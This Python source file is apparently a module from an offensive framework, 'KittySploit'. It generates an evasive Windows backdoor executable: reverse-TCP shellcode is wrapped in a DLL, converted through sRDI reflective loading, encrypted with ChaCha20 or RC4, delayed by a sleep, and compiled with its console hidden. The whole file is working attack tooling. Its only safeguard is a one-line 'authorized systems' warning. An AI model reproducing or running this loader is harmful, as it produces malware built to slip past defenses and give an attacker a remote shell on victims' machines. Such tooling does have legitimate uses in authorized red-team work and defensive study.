#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Self-reflective DLL injection (sRDI) evasion loader.

Wraps raw shellcode in a minimal DLL, converts it to position-independent
shellcode via sRDI (monoxgas), encrypts the result, and embeds it in a loader EXE.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import (
    compile_c_pe,
    generate_payload_bytes,
    option_value,
    prepare_exe_output,
    report_payload_size,
)
from lib.compile.min_dll import build_shellcode_dll
from lib.compile.srdi import ConvertToShellcode, HashFunctionName
from lib.compile.srdi_loader import SrdiLoaderBuilder
from lib.compile.syscall_evasion import SyscallEvasionBuilder


class Module(Backdoor):
    __info__ = {
        "name": "sRDI Reflective DLL Evasion",
        "description": (
            "Generate a Windows x64 EXE that embeds sRDI-converted shellcode. "
            "Raw payload is wrapped in a minimal DLL, converted to reflective loader "
            "shellcode, encrypted (ChaCha20/RC4), and executed in-process."
        ),
        "author": "KittySploit",
        "platform": Platform.WINDOWS,
        "arch": Arch.X64,
        "references": [
            "https://github.com/monoxgas/sRDI",
            "https://github.com/stephenfewer/ReflectiveDLLInjection",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/windows/x86/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    export_name = OptString("Execute", "Exported DLL function invoked by sRDI after load", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(10000, "Sleep milliseconds before executing sRDI shellcode", False)
    output_name = OptString("srdi_evasion.exe", "Output executable filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the EXE", False, advanced=True)
    windows_subsystem = OptChoice(
        "windows",
        "PE subsystem (windows hides console)",
        False,
        ["windows", "console"],
    )

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        raw_payload = generate_payload_bytes(self)
        if not raw_payload:
            return False

        report_payload_size(raw_payload)

        export_name = str(option_value(self, "export_name") or "Execute")
        try:
            dll_bytes = build_shellcode_dll(raw_payload, export_name=export_name)
            srdi_shellcode = ConvertToShellcode(
                dll_bytes,
                function_hash=HashFunctionName(export_name),
            )
        except Exception as exc:
            print_error(f"sRDI conversion failed: {exc}")
            return False

        print_status(f"sRDI shellcode size: {len(srdi_shellcode)} bytes (DLL wrapper: {len(dll_bytes)} bytes)")

        builder = SrdiLoaderBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        encoded, key, iv = builder.encrypt_payload(srdi_shellcode)
        source = builder.build_source(encoded, key, iv)

        out_dir, exe_name = prepare_exe_output(
            self,
            "backdoors/windows/evasion",
            str(option_value(self, "output_name") or "srdi_evasion.exe"),
        )
        exe_path = out_dir / exe_name

        if option_value(self, "save_source"):
            src_path = out_dir / "srdi_loader.c"
            src_path.write_text(source, encoding="utf-8")
            print_success(f"C source saved: {src_path}")

        ok = compile_c_pe(
            source=source,
            exe_path=exe_path,
            headers_dir=str(SyscallEvasionBuilder.headers_directory()),
            framework=getattr(self, "framework", None),
            optimization=str(option_value(self, "optimization") or "ReleaseSmall"),
            windows_subsystem=str(option_value(self, "windows_subsystem") or "windows"),
        )

        if ok and exe_path.is_file():
            size = exe_path.stat().st_size
            print_success(f"Backdoor executable generated: {exe_path} ({size} bytes)")
            print_info(
                f"Export: {export_name} | Cipher: {option_value(self, 'cipher')} | "
                f"Sleep: {option_value(self, 'sleep')} ms"
            )
            print_warning("Use only on authorized systems. Start a matching listener before running the EXE.")
            return True

        print_error("PE compilation failed. Ensure Zig is installed (core/lib/compiler/zig_executable or PATH).")
        return False
